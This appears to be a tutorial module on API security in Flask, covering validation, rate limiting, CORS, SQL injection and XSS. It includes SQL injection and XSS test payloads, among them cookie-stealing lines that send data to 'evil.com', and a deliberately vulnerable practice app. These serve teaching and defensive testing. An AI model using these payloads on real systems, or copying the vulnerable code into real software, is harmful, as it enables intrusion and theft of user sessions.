# 🛡️ API Security

Learn how to protect your APIs from common security threats and vulnerabilities.

## 🎯 Learning Objectives

By the end of this module, you will:
- Understand common API security threats
- Implement input validation
- Set up rate limiting
- Configure CORS properly
- Prevent SQL injection attacks
- Prevent XSS (Cross-Site Scripting) attacks
- Follow security best practices

## Common API Security Threats 🚨

### 1. Injection Attacks
Malicious code inserted into queries

### 2. Broken Authentication
Weak login systems allowing unauthorized access

### 3. Sensitive Data Exposure
Leaking passwords, tokens, or personal information

### 4. Broken Access Control
Users accessing resources they shouldn't

### 5. Security Misconfiguration
Default passwords, unnecessary services enabled

### 6. Cross-Site Scripting (XSS)
Injecting malicious scripts into web pages

### 7. Lack of Rate Limiting
Allowing unlimited requests (DDoS attacks)

### 8. CORS Misconfiguration
Allowing untrusted origins to access your API

## Input Validation 📝

**Rule**: Never trust user input!

### Why Input Validation Matters

Input validation is your first line of defense against attacks. Without it:
- Attackers can inject malicious code (SQL injection, XSS)
- Your application can crash from unexpected data
- Business logic can be bypassed
- Data integrity is compromised

### Validating Data Types

Always verify that input matches expected types:

```python
from flask import Flask, request, jsonify

@app.route('/api/product', methods=['POST'])
def create_product():
    data = request.json
    
    # Check data types
    if not isinstance(data.get('name'), str):
        return jsonify({'error': 'Name must be a string'}), 400
    
    if not isinstance(data.get('price'), (int, float)):
        return jsonify({'error': 'Price must be a number'}), 400
    
    if not isinstance(data.get('in_stock'), bool):
        return jsonify({'error': 'in_stock must be a boolean'}), 400
    
    # Proceed with creation
    return jsonify({'message': 'Product created'}), 201
```

### Validating Ranges

Ensure values fall within acceptable ranges:

```python
@app.route('/api/product', methods=['POST'])
def create_product():
    data = request.json
    
    # Validate price range
    price = data.get('price')
    if price < 0:
        return jsonify({'error': 'Price cannot be negative'}), 400
    if price > 1000000:
        return jsonify({'error': 'Price too high'}), 400
    
    # Validate quantity range
    quantity = data.get('quantity', 0)
    if quantity < 0 or quantity > 10000:
        return jsonify({'error': 'Invalid quantity'}), 400
    
    return jsonify({'message': 'Product created'}), 201
```

### Sanitizing Input

Remove or escape dangerous characters:

```python
import re
from markupsafe import escape

@app.route('/api/comment', methods=['POST'])
def create_comment():
    data = request.json
    text = data.get('text', '')
    
    # Remove HTML tags
    sanitized = re.sub(r'<[^>]+>', '', text)
    
    # Or escape HTML entities
    sanitized = escape(text)
    
    # Remove excessive whitespace
    sanitized = ' '.join(sanitized.split())
    
    # Limit length
    if len(sanitized) > 500:
        sanitized = sanitized[:500]
    
    return jsonify({'comment': sanitized}), 201
```

### Using Validation Libraries

**Pydantic** - Powerful data validation:

```python
from pydantic import BaseModel, EmailStr, Field, validator
from flask import Flask, request, jsonify

app = Flask(__name__)

class UserCreate(BaseModel):
    username: str = Field(..., min_length=3, max_length=20)
    email: EmailStr
    age: int = Field(..., ge=13, le=120)
    website: str | None = None
    
    @validator('username')
    def username_alphanumeric(cls, v):
        if not v.isalnum():
            raise ValueError('Username must be alphanumeric')
        return v
    
    @validator('website')
    def validate_website(cls, v):
        if v and not v.startswith(('http://', 'https://')):
            raise ValueError('Website must start with http:// or https://')
        return v

@app.route('/users', methods=['POST'])
def create_user():
    try:
        user = UserCreate(**request.json)
        # Data is validated, proceed with creation
        return jsonify({'message': 'User created', 'username': user.username}), 201
    except Exception as e:
        return jsonify({'error': str(e)}), 400
```

**Marshmallow** - Schema validation:

```python
from marshmallow import Schema, fields, validate, ValidationError
from flask import Flask, request, jsonify

class UserSchema(Schema):
    username = fields.Str(
        required=True,
        validate=validate.Length(min=3, max=20)
    )
    email = fields.Email(required=True)
    age = fields.Int(validate=validate.Range(min=13, max=120))
    role = fields.Str(validate=validate.OneOf(['user', 'admin', 'moderator']))

@app.route('/users', methods=['POST'])
def create_user():
    schema = UserSchema()
    try:
        result = schema.load(request.json)
        # Data is validated
        return jsonify({'message': 'User created'}), 201
    except ValidationError as err:
        return jsonify({'errors': err.messages}), 400
```

### Validate All Inputs

```python
from flask import Flask, request, jsonify
import re

app = Flask(__name__)

@app.route('/users', methods=['POST'])
def create_user():
    data = request.json
    
    # Validate username
    username = data.get('username', '').strip()
    if not username:
        return jsonify({'error': 'Username required'}), 400
    if len(username) < 3 or len(username) > 20:
        return jsonify({'error': 'Username must be 3-20 characters'}), 400
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        return jsonify({'error': 'Username can only contain letters, numbers, and underscores'}), 400
    
    # Validate email
    email = data.get('email', '').strip()
    if not email:
        return jsonify({'error': 'Email required'}), 400
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
        return jsonify({'error': 'Invalid email format'}), 400
    
    # Validate age
    age = data.get('age')
    if age is not None:
        if not isinstance(age, int) or age < 0 or age > 150:
            return jsonify({'error': 'Invalid age'}), 400
    
    # Data is validated, proceed with creation
    # ...
    return jsonify({'message': 'User created'}), 201
```

### Use Type Checking

```python
from flask import Flask, request, jsonify
from typing import Dict, Any

def validate_user_data(data: Dict[str, Any]) -> tuple[bool, str]:
    """
    Returns (is_valid, error_message)
    """
    if not isinstance(data, dict):
        return False, "Data must be an object"
    
    if 'username' not in data:
        return False, "Username is required"
    
    if not isinstance(data['username'], str):
        return False, "Username must be a string"
    
    if 'age' in data and not isinstance(data['age'], int):
        return False, "Age must be a number"
    
    return True, ""

@app.route('/users', methods=['POST'])
def create_user():
    is_valid, error = validate_user_data(request.json)
    if not is_valid:
        return jsonify({'error': error}), 400
    
    # Proceed with creation
    # ...
```

## Rate Limiting 🚦

Prevent abuse by limiting requests per user/IP.

### Why Rate Limiting is Needed

**1. DoS/DDoS Prevention:**
Prevents attackers from overwhelming your server with requests, keeping your service available for legitimate users.

**2. Cost Control:**
- API costs (third-party services charge per request)
- Infrastructure costs (bandwidth, compute resources)
- Database load management

**3. Fair Usage:**
Ensures all users get fair access to resources.

**4. Brute Force Protection:**
Slows down password guessing and credential stuffing attacks.

### Implementation Strategies

#### 1. Fixed Window
Count requests in fixed time windows (e.g., per minute).

**Pros:** Simple to implement  
**Cons:** Burst at window boundaries

#### 2. Sliding Window
Track requests in a rolling time window.

**Pros:** Smoother rate limiting  
**Cons:** More complex, requires more memory

#### 3. Token Bucket
Requests consume tokens; tokens regenerate over time.

**Pros:** Allows burst traffic  
**Cons:** More complex algorithm

#### 4. Leaky Bucket
Requests processed at constant rate, excess requests queued or dropped.

**Pros:** Smooth traffic  
**Cons:** May delay requests

### HTTP 429 Status Code

When rate limit is exceeded, return **429 Too Many Requests**:

```python
from flask import Flask, jsonify

@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        'error': 'Too Many Requests',
        'message': 'Rate limit exceeded. Please try again later.',
        'retry_after': 60  # seconds
    }), 429
```

### Rate Limit Headers

Always inform clients about their rate limit status using standard headers:

```python
from flask import Flask, make_response, jsonify
import time

@app.route('/api/data')
def get_data():
    response = make_response(jsonify({'data': 'some data'}))
    
    # Standard rate limit headers
    response.headers['X-RateLimit-Limit'] = '100'        # Max requests per window
    response.headers['X-RateLimit-Remaining'] = '87'     # Requests remaining
    response.headers['X-RateLimit-Reset'] = '1640000000' # Unix timestamp when limit resets
    
    # Alternative: time until reset (in seconds)
    response.headers['X-RateLimit-Reset-After'] = '3600'
    
    # When rate limited (429 response)
    # response.headers['Retry-After'] = '60'  # Seconds to wait
    
    return response
```

**Header Explanations:**
- `X-RateLimit-Limit`: Maximum requests allowed in the time window
- `X-RateLimit-Remaining`: Number of requests remaining in current window
- `X-RateLimit-Reset`: Unix timestamp when the rate limit resets
- `Retry-After`: Seconds to wait before making another request (used with 429)

### Using Flask-Limiter

```python
from flask import Flask, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)

# Configure rate limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,  # Limit by IP address
    default_limits=["200 per day", "50 per hour"]
)

# Global rate limit applied to all routes
@app.route('/api/data')
def get_data():
    return jsonify({'data': 'some data'})

# Specific rate limit for this route
@app.route('/api/expensive')
@limiter.limit("10 per minute")
def expensive_operation():
    return jsonify({'result': 'computed'})

# More strict limit for authentication
@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Prevent brute force attacks
    # ...
    return jsonify({'token': 'xyz123'})

# Error handler
@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        'error': 'Rate limit exceeded. Try again later.',
        'retry_after': 60
    }), 429

if __name__ == '__main__':
    app.run(debug=True)
```

### Code Examples with Rate Limit Headers

**Complete example with proper headers:**

```python
from flask import Flask, jsonify, make_response
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import time

app = Flask(__name__)

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["100 per hour"],
    headers_enabled=True  # Automatically adds rate limit headers
)

@app.route('/api/data')
@limiter.limit("10 per minute")
def get_data():
    # Headers are automatically added by Flask-Limiter:
    # X-RateLimit-Limit: 10
    # X-RateLimit-Remaining: 7
    # X-RateLimit-Reset: 1640000060
    return jsonify({'data': 'some data'})

@app.errorhandler(429)
def ratelimit_error(e):
    return jsonify({
        'error': 'Too Many Requests',
        'message': str(e.description),
        'retry_after': 60
    }), 429

if __name__ == '__main__':
    app.run(debug=True)
```

### Manual Rate Limiting

```python
from flask import Flask, request, jsonify
from collections import defaultdict
from datetime import datetime, timedelta

app = Flask(__name__)

# Track requests by IP
request_counts = defaultdict(list)

def check_rate_limit(ip_address, limit=10, window=60):
    """
    Returns True if rate limit is exceeded
    limit: max requests
    window: time window in seconds
    """
    now = datetime.now()
    cutoff = now - timedelta(seconds=window)
    
    # Remove old requests
    request_counts[ip_address] = [
        req_time for req_time in request_counts[ip_address]
        if req_time > cutoff
    ]
    
    # Check if limit exceeded
    if len(request_counts[ip_address]) >= limit:
        return True
    
    # Record this request
    request_counts[ip_address].append(now)
    return False

@app.route('/api/data')
def get_data():
    ip = request.remote_addr
    
    if check_rate_limit(ip, limit=10, window=60):
        return jsonify({'error': 'Rate limit exceeded'}), 429
    
    return jsonify({'data': 'some data'})
```

## CORS (Cross-Origin Resource Sharing) 🌐

Control which websites can access your API.

### What Problem Does CORS Solve?

**The Same-Origin Policy** is a security feature built into browsers that blocks web pages from making requests to a different domain than the one serving the page.

**Same Origin Examples:**
- ✅ `https://example.com/page1` → `https://example.com/api` (Same)
- ❌ `https://example.com` → `https://api.example.com` (Different subdomain)
- ❌ `http://example.com` → `https://example.com` (Different protocol)
- ❌ `https://example.com:3000` → `https://example.com:4000` (Different port)

**The Problem:**
```
Browser at https://myapp.com tries to fetch https://api.other-site.com
→ Blocked by Same-Origin Policy!
```

**The Solution:**
CORS allows servers to specify which origins are allowed to access their resources.

### How CORS Works

#### Simple Requests

For simple GET, POST, or HEAD requests:

```
1. Browser sends request with Origin header:
   GET /api/data
   Origin: https://myapp.com

2. Server responds with Access-Control-Allow-Origin:
   Access-Control-Allow-Origin: https://myapp.com
   
3. Browser allows the response to be read by JavaScript
```

#### Preflight Requests

For complex requests (PUT, DELETE, custom headers), browser sends a preflight OPTIONS request first:

```
1. Browser sends OPTIONS request:
   OPTIONS /api/users/123
   Origin: https://myapp.com
   Access-Control-Request-Method: DELETE
   Access-Control-Request-Headers: Authorization

2. Server responds with allowed methods/headers:
   Access-Control-Allow-Origin: https://myapp.com
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: Authorization, Content-Type
   Access-Control-Max-Age: 86400

3. If allowed, browser sends actual DELETE request
```

### CORS Headers Explained

#### Response Headers (Server → Browser)

**`Access-Control-Allow-Origin`**
Specifies which origins can access the resource.

```python
# Allow specific origin
response.headers['Access-Control-Allow-Origin'] = 'https://myapp.com'

# Allow any origin (NOT RECOMMENDED for production)
response.headers['Access-Control-Allow-Origin'] = '*'

# Allow credentials with specific origin (can't use * with credentials)
response.headers['Access-Control-Allow-Origin'] = 'https://myapp.com'
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

**`Access-Control-Allow-Methods`**
Specifies allowed HTTP methods:

```python
response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
```

**`Access-Control-Allow-Headers`**
Specifies allowed request headers:

```python
response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With'
```

**`Access-Control-Max-Age`**
How long (in seconds) preflight responses can be cached:

```python
response.headers['Access-Control-Max-Age'] = '86400'  # 24 hours
```

**`Access-Control-Expose-Headers`**
Headers the browser can access in the response:

```python
response.headers['Access-Control-Expose-Headers'] = 'X-RateLimit-Remaining, X-RateLimit-Limit'
```

**`Access-Control-Allow-Credentials`**
Allow cookies and authentication:

```python
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

### Common CORS Errors

#### Error 1: "No 'Access-Control-Allow-Origin' header"

```
Access to fetch at 'https://api.example.com/data' from origin 'https://myapp.com' 
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present.
```

**Fix:** Add the header to your response:
```python
response.headers['Access-Control-Allow-Origin'] = 'https://myapp.com'
```

#### Error 2: "The 'Access-Control-Allow-Origin' header contains multiple values"

**Wrong:**
```python
response.headers['Access-Control-Allow-Origin'] = 'https://app1.com, https://app2.com'
```

**Fix:** Only one origin allowed. For multiple origins, check the request origin dynamically:
```python
allowed_origins = ['https://app1.com', 'https://app2.com']
origin = request.headers.get('Origin')
if origin in allowed_origins:
    response.headers['Access-Control-Allow-Origin'] = origin
```

#### Error 3: "Wildcard '*' cannot be used when credentials are included"

**Wrong:**
```python
response.headers['Access-Control-Allow-Origin'] = '*'
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

**Fix:** Specify exact origin:
```python
response.headers['Access-Control-Allow-Origin'] = 'https://myapp.com'
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

#### Error 4: "Method [X] is not allowed by Access-Control-Allow-Methods"

```
Access to fetch at 'https://api.example.com/data' from origin 'https://myapp.com'
has been blocked by CORS policy: Method PUT is not allowed by Access-Control-Allow-Methods.
```

**Fix:** Add the method to allowed methods:
```python
response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
```

#### Error 5: "Request header [X] is not allowed by Access-Control-Allow-Headers"

**Fix:** Add the header to allowed headers:
```python
response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Custom-Header'
```

### Proper CORS Configuration

**Production-Ready Configuration:**

```python
from flask import Flask, request, make_response

app = Flask(__name__)

# Whitelist of allowed origins
ALLOWED_ORIGINS = [
    'https://myapp.com',
    'https://www.myapp.com',
    'https://staging.myapp.com'
]

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')
    
    # Only add CORS headers if origin is in whitelist
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        response.headers['Access-Control-Max-Age'] = '3600'
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    
    return response

# Handle preflight requests
@app.route('/<path:path>', methods=['OPTIONS'])
def handle_options(path):
    response = make_response('', 204)
    return response
```

### Security Implications

**❌ DON'T: Allow All Origins in Production**

```python
# DANGEROUS in production!
response.headers['Access-Control-Allow-Origin'] = '*'
```

**Why it's dangerous:**
- Any website can access your API
- Opens door to CSRF attacks
- Exposes sensitive data to untrusted origins

**✅ DO: Use Whitelist**

```python
# SAFE: Only allow specific origins
ALLOWED_ORIGINS = ['https://myapp.com']
origin = request.headers.get('Origin')
if origin in ALLOWED_ORIGINS:
    response.headers['Access-Control-Allow-Origin'] = origin
```

**❌ DON'T: Reflect Origin Without Validation**

```python
# DANGEROUS: Reflects any origin
origin = request.headers.get('Origin')
response.headers['Access-Control-Allow-Origin'] = origin  # NO!
```

**✅ DO: Validate Before Reflecting**

```python
# SAFE: Validate against whitelist
origin = request.headers.get('Origin')
if origin in ALLOWED_ORIGINS:
    response.headers['Access-Control-Allow-Origin'] = origin
```

**Development vs Production:**

```python
import os

# Development: Allow localhost
if os.getenv('FLASK_ENV') == 'development':
    ALLOWED_ORIGINS = [
        'http://localhost:3000',
        'http://localhost:8080',
        'https://myapp.com'
    ]
else:
    # Production: Only allow production domains
    ALLOWED_ORIGINS = [
        'https://myapp.com',
        'https://www.myapp.com'
    ]
```

### The Same-Origin Policy Problem

```

### Configuring CORS with Flask-CORS

```python
from flask import Flask, jsonify
from flask_cors import CORS

app = Flask(__name__)

# Option 1: Allow all origins (NOT recommended for production!)
CORS(app)

# Option 2: Allow specific origins (RECOMMENDED)
CORS(app, origins=[
    "https://example.com",
    "https://www.example.com"
])

# Option 3: Configure per-route
from flask_cors import cross_origin

@app.route('/public-api')
@cross_origin()  # Allow any origin for this route
def public_api():
    return jsonify({'data': 'public'})

@app.route('/private-api')
@cross_origin(origins=['https://example.com'])  # Specific origin only
def private_api():
    return jsonify({'data': 'private'})
```

### Manual CORS Headers

```python
from flask import Flask, jsonify, request

app = Flask(__name__)

@app.after_request
def add_cors_headers(response):
    # Only allow specific origin
    origin = request.headers.get('Origin')
    if origin in ['https://example.com', 'https://www.example.com']:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
    return response
```

## SQL Injection Prevention 💉

**SQL Injection**: Malicious SQL code inserted through user input.

### What is SQL Injection?

![Exploits of a Mom - XKCD #327](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)
*Source: [XKCD #327 - Exploits of a Mom](https://xkcd.com/327/)*

SQL Injection occurs when an attacker manipulates SQL queries by injecting malicious input. This can allow them to:
- Access unauthorized data
- Modify or delete data
- Execute administrative operations
- In some cases, execute commands on the operating system

### How SQL Injection Works

Consider a login form that checks credentials:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
```

An attacker enters:
- Username: `admin' --`
- Password: (anything)

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` comments out the rest of the query, bypassing the password check!

### Vulnerable Code (DON'T DO THIS!)

```python
import sqlite3

# VULNERABLE TO SQL INJECTION!
@app.route('/users/<username>')
def get_user(username):
    conn = sqlite3.connect('app.db')
    # Danger: Direct string interpolation
    query = f"SELECT * FROM users WHERE username = '{username}'"
    user = conn.execute(query).fetchone()
    return jsonify(user)

# Attack: /users/admin' OR '1'='1
# Resulting query: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# Returns all users!
```

### Safe Code (Use Parameterized Queries)

```python
import sqlite3

# SAFE: Using parameterized queries
@app.route('/users/<username>')
def get_user(username):
    conn = sqlite3.connect('app.db')
    # Safe: Use placeholders (?)
    query = "SELECT * FROM users WHERE username = ?"
    user = conn.execute(query, (username,)).fetchone()
    return jsonify(user)

# Attack is harmless - treated as literal string
# Query looks for username literally containing "admin' OR '1'='1"
```

### Prevention with Parameterized Queries

Parameterized queries (also called prepared statements) separate SQL code from data:

**Python (sqlite3)**:
```python
# Safe - uses placeholders
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

**Python (psycopg2 for PostgreSQL)**:
```python
# Safe - uses %s placeholders (not Python string formatting!)
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

**Python (mysql.connector)**:
```python
# Safe - uses %s placeholders
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

### Testing for SQL Injection

**Manual Testing - Try These Inputs:**

1. Single quote: `'`
2. SQL comment: `' --`
3. Boolean logic: `' OR '1'='1`
4. Union attacks: `' UNION SELECT NULL--`
5. Time-based: `'; WAITFOR DELAY '00:00:05'--`

**Example Test:**
```bash
# Test if endpoint is vulnerable
curl "http://localhost:5000/api/users?id=1' OR '1'='1"

# If you get all users instead of just user 1, it's vulnerable!
```

**Automated Testing:**
```python
# test_sql_injection.py
import requests

def test_sql_injection():
    payloads = [
        "1' OR '1'='1",
        "1'; DROP TABLE users--",
        "1' UNION SELECT NULL--",
    ]
    
    for payload in payloads:
        response = requests.get(f"http://localhost:5000/api/users/{payload}")
        # Check if error messages reveal database info
        assert "SQL" not in response.text.lower()
        assert "syntax" not in response.text.lower()
        print(f"✓ Payload '{payload}' handled safely")
```

### Hands-on Exercise: Vulnerable App

**Vulnerable Code (for learning purposes):**

```python
# vulnerable_app.py - DO NOT USE IN PRODUCTION!
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

# Setup database
def init_db():
    conn = sqlite3.connect('vulnerable.db')
    conn.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            password TEXT,
            email TEXT
        )
    ''')
    conn.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'secret123', 'admin@example.com')")
    conn.execute("INSERT OR IGNORE INTO users VALUES (2, 'user', 'pass456', 'user@example.com')")
    conn.commit()
    conn.close()

init_db()

# VULNERABLE ENDPOINT
@app.route('/api/users/<username>')
def get_user(username):
    conn = sqlite3.connect('vulnerable.db')
    # DANGER: String concatenation
    query = f"SELECT * FROM users WHERE username = '{username}'"
    print(f"Executing: {query}")  # For learning purposes
    try:
        result = conn.execute(query).fetchall()
        return jsonify({'users': result})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
```

**Exercise Steps:**

1. Run the vulnerable app: `python vulnerable_app.py`
2. Try normal request: `curl http://localhost:5000/api/users/admin`
3. Try SQL injection: `curl http://localhost:5000/api/users/admin'%20OR%20'1'='1`
4. Observe that you get all users!
5. Now fix it by using parameterized queries
6. Test again to verify the fix

**Fixed Version:**
```python
@app.route('/api/users/<username>')
def get_user(username):
    conn = sqlite3.connect('vulnerable.db')
    # SAFE: Parameterized query
    query = "SELECT * FROM users WHERE username = ?"
    result = conn.execute(query, (username,)).fetchall()
    return jsonify({'users': result})
```

### Using ORMs (Object-Relational Mappers)

ORMs like SQLAlchemy automatically prevent SQL injection:

```python
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True)

@app.route('/users/<username>')
def get_user(username):
    # Safe: SQLAlchemy uses parameterized queries
    user = User.query.filter_by(username=username).first()
    return jsonify({'username': user.username})
```

## XSS (Cross-Site Scripting) Prevention 🚫

**XSS**: Injecting malicious JavaScript into pages viewed by other users.

### What is XSS?

Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. When successful, attackers can:
- Steal session cookies and tokens
- Redirect users to malicious sites
- Modify page content
- Perform actions on behalf of the user
- Capture keystrokes

### Types of XSS

#### 1. Reflected XSS

The malicious script comes from the current HTTP request. The script is "reflected" off the web server.

**Example:**
```
http://example.com/search?q=<script>alert('XSS')</script>
```

The server displays: "Search results for: `<script>alert('XSS')</script>`"

If not escaped, the script executes in the victim's browser!

**Vulnerable Code:**
```python
from flask import Flask, request

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # DANGEROUS: Directly rendering user input
    return f"<h1>Search results for: {query}</h1>"
```

**Attack URL:**
```
http://localhost:5000/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>
```

#### 2. Stored XSS (Persistent XSS)

The malicious script is stored on the server (in a database, comment field, etc.) and executed whenever users view that data.

**Example Scenario:**
1. Attacker posts a comment: `Great article! <script>steal_cookies()</script>`
2. Comment is saved to database without sanitization
3. Every user who views the page executes the malicious script

**Vulnerable Code:**
```python
from flask import Flask, request, render_template_string
import sqlite3

@app.route('/comments', methods=['POST'])
def post_comment():
    comment = request.json['text']
    # DANGEROUS: Storing unsanitized input
    conn = sqlite3.connect('app.db')
    conn.execute("INSERT INTO comments (text) VALUES (?)", (comment,))
    conn.commit()
    return jsonify({'message': 'Comment posted'})

@app.route('/comments')
def view_comments():
    conn = sqlite3.connect('app.db')
    comments = conn.execute("SELECT text FROM comments").fetchall()
    # DANGEROUS: Rendering unsanitized data
    html = "<html><body>"
    for comment in comments:
        html += f"<p>{comment[0]}</p>"  # XSS vulnerability!
    html += "</body></html>"
    return html
```

#### 3. DOM-based XSS

The vulnerability exists in client-side JavaScript code rather than server-side code.

**Vulnerable JavaScript:**
```html
<script>
    // Get name from URL fragment
    const urlParams = new URLSearchParams(window.location.search);
    const name = urlParams.get('name');
    
    // DANGEROUS: Directly inserting into DOM
    document.getElementById('greeting').innerHTML = `Hello ${name}!`;
</script>
```

**Attack URL:**
```
http://example.com/page?name=<img src=x onerror=alert('XSS')>
```

### Prevention Techniques

#### 1. Escape Output

Always escape HTML entities when rendering user input:

```python
from markupsafe import escape
from flask import Flask, request

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # SAFE: Escape HTML entities
    safe_query = escape(query)
    return f"<h1>Search results for: {safe_query}</h1>"
```

**What `escape()` does:**
```
< becomes &lt;
> becomes &gt;
& becomes &amp;
" becomes &quot;
' becomes &#39;
```

#### 2. Use Template Engines

Most modern template engines auto-escape by default:

```python
from flask import Flask, render_template

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Jinja2 auto-escapes by default
    return render_template('search.html', query=query)
```

**Template (search.html):**
```html
<h1>Search results for: {{ query }}</h1>
<!-- Automatically escaped! -->
```

#### 3. Sanitize HTML Input

If you must allow HTML (e.g., rich text editor), use a whitelist approach:

```python
import bleach

@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.json['text']
    
    # Allow only specific safe tags
    safe_comment = bleach.clean(
        comment,
        tags=['b', 'i', 'u', 'a', 'p', 'br'],
        attributes={'a': ['href', 'title']},
        protocols=['http', 'https'],
        strip=True
    )
    
    # Store sanitized version
    save_to_db(safe_comment)
    return jsonify({'message': 'Posted'})
```

#### 4. Use Content Security Policy (CSP)

CSP tells the browser which sources of content are trusted:

```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' https://trusted-cdn.com; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none';"
    )
    return response
```

**CSP Directives Explained:**
- `default-src 'self'`: Only load resources from same origin
- `script-src 'self'`: Only execute scripts from same origin
- `style-src 'self' 'unsafe-inline'`: Allow inline styles (use sparingly)
- `img-src 'self' data: https:`: Allow images from same origin, data URIs, and HTTPS
- `frame-ancestors 'none'`: Prevent page from being framed (clickjacking protection)

#### 5. HTTPOnly Cookies

Prevent JavaScript access to cookies:

```python
from flask import Flask, make_response

@app.route('/login', methods=['POST'])
def login():
    response = make_response(jsonify({'message': 'Logged in'}))
    # HTTPOnly prevents JavaScript access
    response.set_cookie(
        'session_token',
        value='abc123',
        httponly=True,  # XSS can't steal this cookie
        secure=True,    # Only send over HTTPS
        samesite='Strict'  # CSRF protection
    )
    return response
```

### Testing for XSS

**Common XSS Test Payloads:**

```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
<script>fetch('http://evil.com?c='+document.cookie)</script>
```

**Automated Testing:**

```python
# test_xss.py
import requests

def test_xss_prevention():
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
    ]
    
    for payload in payloads:
        response = requests.post(
            'http://localhost:5000/api/comment',
            json={'text': payload}
        )
        
        # Verify payload is escaped or sanitized
        assert "<script>" not in response.text
        assert "onerror=" not in response.text
        print(f"✓ XSS payload blocked: {payload[:30]}...")
```

### Vulnerable Code

```python
from flask import Flask, request

# VULNERABLE!
@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.json['text']
    # Storing unsanitized user input
    save_to_db(comment)
    
    # Later, when displaying:
    # <div>{comment}</div>  ← JavaScript can execute!
    return jsonify({'message': 'Posted'})

# Attack: <script>alert('XSS!')</script>
```

### Safe Code

```python
from flask import Flask, request, escape
import bleach

# SAFE: Escape HTML
@app.route('/comment', methods=['POST'])
def post_comment():
    comment = request.json['text']
    
    # Option 1: Escape HTML (converts < to &lt;, etc.)
    safe_comment = escape(comment)
    
    # Option 2: Strip HTML tags entirely
    safe_comment = bleach.clean(comment, tags=[], strip=True)
    
    # Option 3: Allow only specific safe tags
    safe_comment = bleach.clean(
        comment,
        tags=['b', 'i', 'u', 'a'],
        attributes={'a': ['href']},
        strip=True
    )
    
    save_to_db(safe_comment)
    return jsonify({'message': 'Posted'})
```

### Content Security Policy

Add header to prevent inline scripts:

```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response
```

## API Security Checklist ✅

Before deploying your API to production, verify all these security measures are in place:

### Essential Security Practices

- [ ] **Use HTTPS everywhere** - Never send sensitive data over HTTP
- [ ] **Validate all input** - Check types, ranges, and formats for all user input
- [ ] **Use parameterized queries** - Prevent SQL injection attacks
- [ ] **Implement authentication** - Verify user identity (JWT, OAuth, API keys)
- [ ] **Implement authorization** - Check user permissions before allowing actions
- [ ] **Rate limit requests** - Prevent abuse and DoS attacks
- [ ] **Configure CORS properly** - Only allow trusted origins
- [ ] **Don't expose sensitive data in responses** - Remove internal IDs, stack traces, etc.
- [ ] **Log security events** - Track login attempts, access violations, etc.
- [ ] **Keep dependencies updated** - Regularly update libraries and scan for vulnerabilities
- [ ] **Use security headers** - Set CSP, X-Frame-Options, HSTS, etc.
- [ ] **Handle errors without leaking info** - Don't expose stack traces or database details

### Additional Security Checks

- [ ] **Hash passwords properly** - Use bcrypt, argon2, or scrypt
- [ ] **Use environment variables for secrets** - Never commit API keys or passwords
